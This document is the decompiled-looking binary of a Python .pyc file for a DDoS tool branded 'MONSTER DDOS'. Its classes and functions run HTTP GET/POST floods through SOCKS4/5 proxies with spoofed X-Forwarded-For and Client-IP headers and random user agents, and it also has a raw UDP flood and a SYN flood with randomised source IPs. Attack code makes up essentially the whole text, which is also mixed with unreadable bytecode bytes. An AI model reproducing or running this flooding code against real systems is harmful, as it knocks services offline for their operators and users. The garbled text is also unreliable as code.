rv   c                   @   s   e Zd Zdd� Zdd� ZdS )r�   c                 C   s   t j�| � || _d S �N��	threading�Thread�__init__�counter��selfr�   r   r   r   r�     s    zraw_dos.__init__c              	   C   s\  t t�dddt�t�dddd�}tdkr8tjt|d� n"tjtd	 t t�	d
d�� |d� z�tdkrttjt|d� n"tjtd	 t t�	d
d�� |d� t
dt t�	d
d�� d t t� d t t� � zLtd�D ]>}tdkr�tjt|d� q�tjtd	 t t�	d
d�� |d� q�W q�   zW n   Y n0 Y q�0 q�W qZ   zW n   Y n0 Y qZ0 qZd S )N�
keep-alive�	max-age=0rW   �vtext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3�gzip, deflate�vi,en;q=0.9,en-US;q=0.8)�Host�
Connection�Cache-Control�Upgrade-Insecure-Requests�
User-Agent�Accept�Accept-Encoding�Accept-Language�Zheadersz/?=r   rs   z [+] bit.ly/AnonyV28 | Raw-DoS @ ��  � => r   rx   )r   r;   r   r   �
useragentsrp   rM   rN   r7   r   r   r!   r   )r�   �headersx�_r   r   r   �run  s@    �""0(zraw_dos.runN��__name__�
__module__�__qualname__r�   r�   r   r   r   r   r�     s   r�   c                   @   s   e Zd Zdd� Zdd� ZdS )rY   c                 C   s   t j�| � || _d S r�   r�   r�   r   r   r   r�   B  s    zProxy.__init__c              	   C   s�  dt �t� d }t �t�}tt �dd��d tt �dd�� d tt �dd�� d tt �dd�� }d| d }|d| d 7 }d	t �t� t d }td
kr�dt	 d tt
� d }|| | | t d }nVt �g d��d tt �dd�� d t	 d tt
� d }|| | | | t d }t}|tt�k �rPt| �� �d�}	nt �t��� �d�}	�z�t�tjtj�}
|
�t|	d �t|	d �f� |
�t�|�� |
�t�|�� |
�t�|�� |
�t�|�� |
�t�|�� |
�t�|�� |
�t�|�� |
�t�|�� |
�t�|�� |
�t�|�� tdt|	d � d t	 d tt
� d � z�tt�D ]�}|
�t�|�� |
�t�|�� |
�t�|�� |
�t�|�� |
�t�|�� |
�t�|�� |
�t�|�� |
�t�|�� |
�t�|�� |
�t�|�� |
�t�|�� �qlW n&   z|
��  W n   Y n0 Y n0 W n:   z |
��  t �t��� �d�}	W n   Y n0 Y n0 �qdd S )N�User-Agent: �
r,   ��   �.r   �X-Forwarded-For: �Client-IP: �	Referer: rW   �GET / HTTP/1.1
Host: r   ��GETZPOSTZHEAD� /?=rs   � HTTP/1.1
Host: z[*] MONSTER DDOS | Socks5 @ � => [rg   )r   r   r�   �	acceptallr   r   �refr7   rp   r;   r!   r}   ry   r%   rH   r6   r:   r=   �AF_INET�SOCK_STREAM�connectrD   �send�encoder   r   r|   rR   �r�   �	useragent�acceptZrandomipZforward�referer�get_host�requestZcurrentrX   �srq   r   r   r   r�   F  sj    
L:,z	Proxy.runNr�   r   r   r   r   rY   @  s   rY   c                   @   s   e Zd Zdd� Zdd� ZdS )r\   c                 C   s   t j�| � || _d S r�   r�   r�   r   r   r   r�   �  s    zSocks.__init__c                 C   s�  dt �t� d }t �t�}tt �dd��d tt �dd�� d tt �dd�� d tt �dd�� }d| d }|d| d 7 }d	t �t� t d }td
kr�dt	 d tt
� d }|| | | t d }nVt �g d��d tt �dd�� d t	 d tt
� d }|| | | | t d }t}|tt�k �rPt| �� �d�}	nt �t��� �d�}	�zt�tjt|	d �t|	d �d� t�� }
|
�tt	�tt
�f� tt
�dk�r�t�|
�}
|
�t�|�� |
�t�|�� |
�t�|�� |
�t�|�� |
�t�|�� |
�t�|�� |
�t�|�� |
�t�|�� |
�t�|�� |
�t�|�� tdt|	d � d t	 d tt
� d � z�tt�D ]�}|
�t�|�� |
�t�|�� |
�t�|�� |
�t�|�� |
�t�|�� |
�t�|�� |
�t�|�� |
�t�|�� |
�t�|�� |
�t�|�� �q�W n&   z|
��  W n   Y n0 Y n0 W �qd   z|
��  W n   Y n0 z�t�tjt|	d �t|	d �d� t�� }
|
�tt	�tt
�f� tt
�dk�r�t�|
�}
|
�t�|�� tdt|	d � d t	 d tt
� d � z$tt�D ]}|
�t�|�� �q.W n&   z|
��  W n   Y n0 Y n0 W n:   z |
��  t �t��� �d�}	W n   Y n0 Y n0 Y n0 �qdd S )Nr�   r�   r,   r�   r�   r   r�   r�   r�   rW   r�   r   r�   r�   rs   r�   T�443z![*] TOOL DDOS MONSTER | Socks5 @ r�   rg   z![*] TOOL DDOS MONSTER | Socks4 @ ) r   r   r�   r�   r   r   r�   r7   rp   r;   r!   r}   ry   r%   rH   r6   r:   r[   ZsetdefaultproxyZPROXY_TYPE_SOCKS5rD   Z
socksocketr�   �ssl�wrap_socketr�   r�   r   r   r|   rR   ZPROXY_TYPE_SOCKS4r�   r   r   r   r�   �  s�    
L:"
,"
,z	Socks.runNr�   r   r   r   r   r\   �  s   r\   c                   @   s   e Zd Zdd� Zdd� ZdS )rV   c                 C   s   t j�| � || _d S r�   r�   r�   r   r   r   r�   �  s    zHome.__init__c              	   C   s�  dt �t� d }t �t�}dt �t� t d }tdkrldt d tt	� d }|| | t
 t d }nVt �g d��d tt �d	d
�� d t d tt	� d }|| | | t
 t d }�z�t�tjtj�}|�tt�tt	�f� tt	�dk�rt�|�}|�t�|�� |�t�|�� |�t�|�� |�t�|�� |�t�|�� |�t�|�� |�t�|�� |�t�|�� |�t�|�� |�t�|�� tdtt �d	d�� d tt� d tt	� � z�tt�D ]�}|�t�|�� |�t�|�� |�t�|�� |�t�|�� |�t�|�� |�t�|�� |�t�|�� |�t�|�� |�t�|�� |�t�|�� td7 a�q�W n.   z|��  td7 aW n   Y n0 Y n0 W q�   z|��  td7 aW n   Y n0 Y q�0 q�d S )Nr�   r�   r�   rW   r�   r   r�   r�   r   rs   r�   r�   z[*] MONSTER DDOS | | Home @ r�   r�   r,   )r   r   r�   r�   r�   r7   rp   r;   r   r!   rQ   r~   r   r=   r�   r�   r�   rD   r�   r�   r�   r�   r   r   r|   r{   rR   rz   )r�   r�   r�   r�   r�   r�   r�   rq   r   r   r   r�   �  sb    
:
0zHome.runNr�   r   r   r   r   rV   �  s   rV   c                   @   s   e Zd Zdd� Zdd� ZdS )r�   c                 C   s   t j�| � || _t�� }d S r�   )r�   r�   r�   r�   �urllib3�PoolManager)r�   r�   r/   r   r   r   r�     s    zJSv1.__init__c              
   C   s�   t �� }tt�dddtdddtd�	}z�tdkr@|jdt|d	� n|jd
tt	�
dd�� |d	� tdtt	�
dd�� d tt� � z"tt�D ]}|jdt|d	� q�W n&   zt��  W n   Y n0 Y n0 W q$   zt��  W n   Y n0 Y q$0 q$d S )Nr�   r�   rW   r�   r�   r�   )	r�   r�   r�   r�   r�   r�   r�   r�   ZCookier�   r�   zGET /?=r   rs   �[*] MONSTER DDOS | JS-Normal @ r�   r�   )r�   r�   r   r;   rk   rj   rp   r�   r7   r   r   r   r   r|   r�   rR   )r�   r/   r�   rq   r   r   r   r�   #  s:    �
$zJSv1.runNr�   r   r   r   r   r�     s   r�   c                   @   s   e Zd Zdd� Zdd� ZdS )r�   c                 C   s   t j�| � || _t�� }d S r�   )r�   r�   r�   r�   ri   rl   )r�   r�   rm   r   r   r   r�   G  s    zJSv2.__init__c              	   C   s  t �� }z�tdkr"|jtdd�}n"|jtd tt�dd�� dd�}tdtt�dd�� d	 tt	� � zLt
t�D ]>}tdkr�|jtdd�}qr|jtd tt�dd�� dd�}qrW n&   zt��  W n   Y n0 Y n0 W q   zt��  W n   Y n0 Y q0 qd S )
NrW   re   rf   z?=r   rs   r�   r�   r�   )ri   rl   rp   rN   r7   r   r   r   r   r;   r   r|   r�   rR   )r�   rm   rn   rq   r   r   r   r�   L  s*    "$(zJSv2.runNr�   r   r   r   r   r�   F  s   r�   c               	   C   sR  t t�tt�f} t�d�}t�tjtj�}z�t	d7 a	|�
|| � tj�dt d t t� d t t	� d t t� d � tj��  zhtt�D ]Z}|�
|| � t	d7 a	tj�dt d t t� d t t	� d t t� d � tj��  q�W n.   z|��  td7 aW n   Y n0 Y n0 W q   z|��  td7 aW n   Y n0 Y q0 qd S )Ni�  r,   z[+] UDP Flood | [r   z
] | Sent [�] | Error: [�])r   r>   rD   r!   r   Z_urandomr=   r�   Z
SOCK_DGRAMr{   Zsendtor   r   rP   r;   rz   �flushr   r|   rR   )Ztar�bytesr�   rq   r   r   r   r�   k  s4    
8
8r�   c                   @   s   e Zd Zdd� Zdd� ZdS )r�   c                 C   s   t j�| � || _d S r�   r�   r�   r   r   r   r�   �  s    zsynflood.__init__c              	   C   s�   t �dd�}t �dd�}t �dd�}t� }d�ttdd� td�D ���|_t|_	t
� }||_t|_d|_||_||_zt|| dd	� td
7 aW n&   ztd
7 aW n   Y n0 Y n0 tj�dtt� d tt� d � tj��  q d S )Nr�   i�_ r�   c                 s   s   | ]}t d d�V  qdS )r   r�   Nr   )�.0r�   r   r   r   �	<genexpr>�  �    zsynflood.run.<locals>.<genexpr>r1   �Sr   )�verboser,   z[+] SYN Flood [ DDoS ] | Sent [r�   r�   )r   r   ZIP�join�mapr   r   �srcr;   ZdstZTCPZsportr!   Zdport�flags�seqZwindowr�   r{   rz   r   r   rP   r�   )r�   Zs_portZs_eqZw_indowZ	IP_PacketZ
TCP_Packetr   r   r   r�   �  s,     $zsynflood.runNr�   r   r   r   r   r�   �  s   r�   �__main__)9r   r   r[   rM   r4   ri   r�   r   r   r   r=   r�   r   �rerF   �timer�   Z
webbrowser�bz2ZdatetimeZjsonr   r   r   Zdisable_warningsr�   r   r   r�   r�   r�   rP   r<   r*   r8   r?   rK   rT   rd   rD   ro   rc   r@   rb   rI   ru   rv   r�   r�   rY   r\   rV   r�   r�   r�   r�   r�   r   r   r   r   �<module>   sv   ,000

	



l',:#+GX>)%!
